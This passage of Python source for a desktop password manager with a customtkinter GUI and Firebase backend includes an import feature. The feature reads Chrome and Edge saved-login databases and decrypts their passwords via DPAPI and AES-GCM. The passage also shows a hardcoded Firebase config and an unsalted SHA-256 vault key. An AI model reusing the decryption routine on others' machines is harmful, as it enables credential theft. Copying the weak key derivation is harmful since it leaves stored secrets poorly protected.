'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', 'right-arrow.png': 'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgEAQAAACJ4248AAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAAAqo0jMgAAAAlwSFlzAAAAYAAAAGAA8GtCzwAAAAd0SU1FB+cJHAs3K+CkvVkAAAIBSURBVFjDtZc/SAJRHMd/7zxsSQgaggjCSaIlMJqE/i2lLi7hoAXReQS5uPbXOxqaTBel0hCHBIPCLemPNCR0Bk0RQTYELdVUi3V2TQWi7zzv3vuN9x7v8/n9ePflDoFKbd1bLNWuTAaVJiehkkzKoVAojH5+gGAh3MK6YjazU2dn4HA4/h8epdPyzfw8SQkGt8D2u911cAAAz9wca0+l1hWGaXmyUQFmpFKBjiadEpbAHrJ8eHurPAWDICgKTQmT2uJFWZImrl9e4Nnlghqqvy8DQ0NMt822OHZ8nMs1kdRYSMsmscxxcJ5IQLVJx55s1nbn883M1GrUBLRIyIN+fxjJMjUBWhJtCdCQaFuAtIQuAZISugVISRgSICFhOMlWh3d3sYl55PWy9r09RUHYRlWTUGtdlCVpnH99RRGnE0YbE7PYWSoVdx4fqUzgr1CfCdsM84CPapYEXNwMBmEjGoW1xlGj7VRq5b1QoCYgnvA8uJvDobC///3GcWpX3dhreMLz4I7HcXD5cmGh1deT/iAiAAfQeQkFIRAgAdc1AUEIBJCYSJCAty1AGt6WAA24ZgFacE0CNOEtBYTZpSV0EIvhEu77jeOM/iVhBQTBbkeiJNGEA6jkANqyWmnDVQXkz3weTq+uaMJVBcLo60suTk9Dbz4P2Y8P6IlESMMBAH4B4yxWfW52Dm8AAAAASUVORK5CYII=', 'shield.png': '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', 'thunder.png': 'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAcVJREFUWEfdl8+LT1EYh59nRZGFhY2UKZGIlOUkCwtkJSs1hn/CjjEs/RGGZKNZamzYYC2/aqxMspqyYkHJR6e+6vbte+d7f3An3uU957zPc957znu7ssnhJvP5twWS7AKeAC/VS12q2asCSe4CBbymzgwqkOQVcGQEXVKvDC2QCnBBvTmYQJI9wMcKcE69P6TAMnC+ApxVX/x1gSRbgNfA/grsG7BN/TmEwA1gYQy0qh7sAi9rGl/DJPuAN8DWMdiKenYIgRXg9ATQA+DaBgLr6te68UYVSHIBeNhxl5+BGfXLpPVNBap3vq3HvHqvcwWSHALetqWO5j8HTqi1G9iwAknK+FPgZAeBH8BxtbTs2pgmMA8sdYCXJbfVq9PW1gok2QF8AHZOSzLxcGmj8zWtAtuB8s2vi1vAxQmDj9UzTcQbWdYlSjKpN3wHjqrvhxBYBQ6MgRbV0rIbRecKJNkNfBqjnFMfNSKPJvURmAWeVWDLaumYraKPwBxQ7XCl3a61orf5Go4nTnIdWPz93IbXbjxPnwrcAS6PEr5TD7fdfZnfR6A0qb3lNailY3aKPgLln+AYcEpd70TvU4GuwD92Bv4bgV/rFIchOFrWgQAAAABJRU5ErkJggg==', 'up-arrow.png': 'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAOFJREFUWEftlDsKwkAURc+tXIGuQiuxtFBL16udnWVKC3eguAEbYSQwgRDymTdTpHmpAvnc887wrpj50sz5OIAbcANuINtACGEFXGKRnSV9ckotCyCEsARuwCaGPoGDpLcVwgwQJ6/D18AjBjb3J6sJE0Bn8nrqI/Br2TCbSAboC5f0qg30PEs+jiSAsfDmzHMhJgFSwksgRgEs4bkQgwA54TkQvQAl4VaIIYAK2MY9N+92C6Juy6YzKkm7blENAdyBBZBdsR2IK/CVtE8CsNZpyfuTa1jy85RvHcANuAE38AfinXgh7zTvzAAAAABJRU5ErkJggg=='}

    def save_image(filename, base64_data):
        image_data = base64.b64decode(base64_data)

        output_path = os.path.join(folder_path, filename)

        with open(output_path, 'wb') as image_file:
            image_file.write(image_data)

    for filename, base64_data in data.items():
        save_image(filename, base64_data)


firebaseConfig = {
    "apiKey": "AIzaSyDO9WgyHMwZwu3n5O2kt55AQ8HcRMYZcGc",
    "authDomain": "password-manager-olildu.firebaseapp.com",
    "projectId": "password-manager-olildu",
    "databaseURL": "https://password-manager-olildu-default-rtdb.asia-southeast1.firebasedatabase.app/",
    "storageBucket": "password-manager-olildu.appspot.com",
    "messagingSenderId": "665242184560",
    "appId": "1:665242184560:web:9a2ebda5f21f0cfedffdb5",
    "measurementId": "G-RDXEQS1P07"
}

firebase = pyrebase.initialize_app(firebaseConfig)
db = firebase.database()
auth = firebase.auth()

user = ""
random_password = ""
closed1 = True
closed2 = True
running = False
master_password = ""
timer = 0
focus_in = True

def is_email_format(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def show_login():
    main_page.pack_forget()
    main_page.place_forget()
    login_page.place_forget()

    login_page.place(relx=0.5, rely=0.5, anchor="center")

def create_user():
    email = email_entry_create.get()
    password = password_entry_create.get()
    if email == "" or password == "":
        pass
    else:
        if is_email_format(email):
            email_alerts.place_forget()
            if len(password) <= 7:
                password_alerts.place(x=22, y=263)
            else:
                email_alerts.place_forget()
                password_alerts.place_forget()
                create_user_var = auth.create_user_with_email_and_password(email, password)
                auth.send_email_verification(create_user_var['idToken'])
                go_to_login_page(event="Created")
        else:
            email_alerts.place(x=22, y=186)

def timer_function(seconds):
    global timer
    for i in range(seconds):
        sleep(1)
        timer += 1
    
    timer = 0



def login(event, email, password):

    if email == "" or password == "":
        pass
    
    else:    
        try:
            def main_code():
                password_main_frame = customtkinter.CTkFrame(master=root, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000,height=680)
                add_password_main_frame = customtkinter.CTkFrame(master=root, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000, height=680)
                add_secure_notes_main_frame = customtkinter.CTkFrame(master=root, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000, height=680)
                generate_password_main_frame = customtkinter.CTkFrame(master=root, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000, height=680)
                generate_password_main_frame2 = customtkinter.CTkFrame(master=root, bg_color="#1A1A1A", fg_color="#1A1A1A", width=500, height=720)
                check_password_main_frame = customtkinter.CTkFrame(master=root, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000, height=630)
                get_started_main_frame1 = customtkinter.CTkFrame(master=root, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000, height=700) #changes
                left_sidebar = customtkinter.CTkFrame(master=root, corner_radius=0, width=250)
                profile_settings_main_frame = customtkinter.CTkFrame(master=root, bg_color="#242424", fg_color="#242424", width=1050, height=800)

                key = base64.urlsafe_b64encode(hashlib.sha256(master_password.encode()).digest()[:32]).decode()
                cipher_suite = Fernet(key)

                left_sidebar.pack(padx=0, pady=0,anchor='w' , fill='y', expand=True)
                left_sidebar.propagate(False)
                details_main_frame = customtkinter.CTkFrame(master=root, width=270, height=310, corner_radius=15, border_color="#3F434A", border_width=1)

                categories_frame = customtkinter.CTkFrame(master=left_sidebar, corner_radius=0)
                tools_frame = customtkinter.CTkFrame(master=left_sidebar, corner_radius=0)

                circle_frame = customtkinter.CTkFrame(master=left_sidebar, width=64 ,height=64, corner_radius=50, fg_color="#212121")
                circle_frame.pack(anchor="w")

                circle_frame_image = PhotoImage(file=folder_path+r'\temp-profile.png')

                circle_frame_image = customtkinter.CTkLabel(master=circle_frame, text="", image=circle_frame_image, fg_color="#212121")
                circle_frame_image.place(relx=0.5, rely=0.5, anchor="center")

                name = auth.get_account_info(id_token=user['idToken'])['users'][0]['displayName']

                customtkinter.CTkLabel(master=left_sidebar, text=f"Hi, {name}", fg_color="#212121",font=customtkinter.CTkFont(family="Sans-Seriff", size=20)).place(y=21, x=65)

                line = Frame(left_sidebar, bg='#4d4d4d', width=400, height=1)
                line.place(y=80, x=0)


                get_started_main_frame = customtkinter.CTkFrame(master=left_sidebar, fg_color="#212121")
                get_started_main_frame.pack(anchor="w",pady=(10,0))

                line = Frame(left_sidebar, bg='#4d4d4d', width=400, height=1)
                line.place(y=140, x=0)

                categories = customtkinter.CTkFrame(master=left_sidebar, fg_color="#212121")
                categories.pack(anchor="w",pady=(10,0))

                catergories_header = customtkinter.CTkLabel(master=categories, text="Catergories", fg_color="#212121",  font=customtkinter.CTkFont(family="Roboto", size=15))
                catergories_header.grid(row=0, column=0,padx=10 , pady=10)

                def collapse_function_1(event):
                    global closed1
                    if closed1:
                        categories_frame.pack_forget()
                        down_arrow.configure(image=PhotoImage(file=folder_path+r"\up-arrow.png"))
                        closed1 = False
                    else:
                        categories_frame.pack(padx=0, pady=5, anchor='nw', after=categories)
                        down_arrow.configure(image=PhotoImage(file=folder_path+r"\down-arrow.png"))
                        closed1 = True

                def collapse_function_2(event):
                    global closed2 
                    if closed2:
                        tools_frame.pack_forget()
                        up_arrow.configure(image=PhotoImage(file=folder_path+r"\up-arrow.png"))
                        closed2 = False
                    else:
                        tools_frame.pack(padx=0, pady=5, anchor='nw', after=tools)
                        up_arrow.configure(image=PhotoImage(file=folder_path+r"\down-arrow.png"))
                        closed2 = True

                down_arrow = customtkinter.CTkLabel(master=categories, text="", image=PhotoImage(file=folder_path+r'\down-arrow.png'), fg_color="#212121", cursor="hand2")
                down_arrow.grid(row=0, column=1,padx=110)
                down_arrow.bind("<Button-1>", collapse_function_1)

                categories_frame.pack(padx=0, pady=5, anchor='nw')



#------------------------------------------------------------------------------- Program Main Functions --------------------------------------------------------------- 

                def import_password(event):
                    email = []
                    password = []
                    website = []

                    edge_main_frame = customtkinter.CTkFrame(root, width=600, height=400, corner_radius=10, bg_color='#212121', fg_color="#2B2B2B")
                    chrome_main_frame = customtkinter.CTkFrame(root, width=600, height=400, corner_radius=10, bg_color='#212121', fg_color="#2B2B2B")
                    firefox_main_frame = customtkinter.CTkFrame(root, width=600, height=400, corner_radius=10, bg_color='#212121', fg_color="#2B2B2B")


                    def destroy_image(event):
                        image_button.place_forget()
                        frame.place_forget()

                        chrome_main_frame.place_forget()
                        firefox_main_frame.place_forget()
                        edge_main_frame.place_forget()

                        email.clear()
                        password.clear()
                        website.clear()
 
                    def get_encryption_key(browser):
                        if browser == "edge":
                            local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Local State")
                        if browser == "chrome":
                            local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")
                        
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = f.read()
                            local_state = json.loads(local_state)

                        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        key = key[5:]
                        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                    def decrypt_password(password, key):
                        try:
                            iv = password[3:15]
                            password = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            return cipher.decrypt(password)[:-16].decode()
                        except:
                            try:
                                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                            except:
                                return ""

                    def main(browser):
                        key = get_encryption_key(browser)

                        if browser == "edge":
                            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                                    "Microsoft", "Edge", "User Data", "default", "Login Data")
                        if browser == "chrome":
                            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                                    "Google", "Chrome", "User Data", "default", "Login Data")
                        
                        filename = "ChromeData.db"
                        shutil.copyfile(db_path, filename)
                        db = sqlite3.connect(filename)
                        cursor = db.cursor()
                        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                        for row in cursor.fetchall():
                            action_url = row[1]
                            username = row[2]
                            password1 = decrypt_password(row[3], key)
                            if username or password1:
                                email.append(username)
                                password.append(password1)
                                website.append(action_url)


                            else:
                                continue
                        cursor.close()
                        db.close()
                        try:
                            os.remove(filename)
                        except:
                            pass

                    def import_chrome_passwords(event):
                        main(browser="chrome")
                        frame.place_forget()

                        chrome_main_frame.lift()
                        chrome_main_frame.place(relx=0.57, rely=0.5, anchor="center")
                        chrome_main_frame.propagate(False)

                        Welcome_Label = customtkinter.CTkLabel(chrome_main_frame, text="Select items to import", font=customtkinter.CTkFont(family="Rem", size=22))
                        Welcome_Label.pack(anchor="w", padx=20, pady=10)

                        line = Frame(chrome_main_frame, bg='#4d4d4d', width=980, height=1)
                        line.pack(padx=15,pady=5)

                        frame12 = customtkinter.CTkFrame(chrome_main_frame, width=980, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                        frame12.pack(pady=(2,2))
                        frame12.propagate(False)

                        checkboxes = []

                        check_var1 = customtkinter.StringVar(value="off")


                        def select_all():
                            a = check_var1.get()
                            if a == "on":
                                for checkbox in checkboxes:
                                    checkbox.select()
                            if a == "off":
                                for checkbox in checkboxes:
                                    checkbox.deselect()

                        outer_checkbox = customtkinter.CTkCheckBox(frame12, text="", onvalue="on", offvalue="off",width=5,font=customtkinter.CTkFont(family="Rem", size=15), command=select_all, variable=check_var1)
                        outer_checkbox.pack(side="left", padx=(17,0))

                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Website",font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=10)

                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Email or Username", font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=(90,53))

                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Password", font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=10)

                        line = Frame(chrome_main_frame, bg='#4d4d4d', width=980, height=1)
                        line.pack(padx=15,pady=5)

                        add_password_frame2 = customtkinter.CTkScrollableFrame(chrome_main_frame, width=1200, height=200, fg_color="#2B2B2B", bg_color="#2B2B2B")
                        add_password_frame2.pack()

                        for x in range(1,len(website)+1):

                            new_mail = ""
                            if len(email[x-1]) >= 19:
                                new_mail = email[x-1][:19] + "..."
                            elif len(email[x-1]) == 0:
                                new_mail = ""
                            else:
                                new_mail = email[x-1]
                                
                            new_website = ""
                            if len(website[x-1]) >= 19:
                                new_website = website[x-1][:19] + "..."
                            elif len(website[x-1]) == 0:
                                continue
                            else:
                                new_website = website[x-1]

                            new_password = ""
                            if len(password[x-1]) >= 19:
                                new_password = "●"*19
                            elif len(password[x-1]) == 0:
                                continue
                            else:
                                length = len(password[x-1])
                                new_password = "●"*length


                            check_var = customtkinter.StringVar(value="off")

                            focal_frame = customtkinter.CTkFrame(add_password_frame2, width=980, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            focal_frame.propagate(False)
                            focal_frame.pack(pady=(2, 2))

                            website_frame = customtkinter.CTkFrame(focal_frame,width=200, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            website_frame.propagate(False)
                            website_frame.grid(column=0, row=0)

                            email_frame = customtkinter.CTkFrame(focal_frame,width=190,  height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            email_frame.propagate(False)
                            email_frame.grid(column=1, row=0)

                            password_frame = customtkinter.CTkFrame(focal_frame,width=190,  height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            password_frame.propagate(False)
                            password_frame.grid(column=2, row=0)

                            checkbox = customtkinter.CTkCheckBox(website_frame, onvalue=x, text="", width=5,variable=check_var,)
                            checkbox.pack(side="left", padx=(10, 0))
                            checkboxes.append(checkbox)

                            Welcome_Label1 = customtkinter.CTkLabel(website_frame, text=f"{new_website}", font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label1.pack(side="left", padx=(10, 0))

                            Welcome_Label2 = customtkinter.CTkLabel(email_frame, text=f"{new_mail}", font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label2.pack(side="left", padx=(10, 0))



